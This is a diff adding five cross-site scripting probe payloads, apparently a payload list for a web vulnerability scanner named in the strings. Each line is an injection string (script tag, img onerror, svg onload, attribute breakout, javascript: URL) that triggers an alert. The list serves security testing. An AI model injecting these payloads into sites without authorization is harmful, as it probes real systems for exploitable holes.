@@ -1,0 +1,5 @@
+<script>alert('WebScanPro_XSS')</script>
+"><img src=x onerror=alert('WebScanPro_XSS')>
+<svg onload=alert('WebScanPro_XSS')>
+"><script>alert('XSS')</script>
+javascript:alert('XSS')
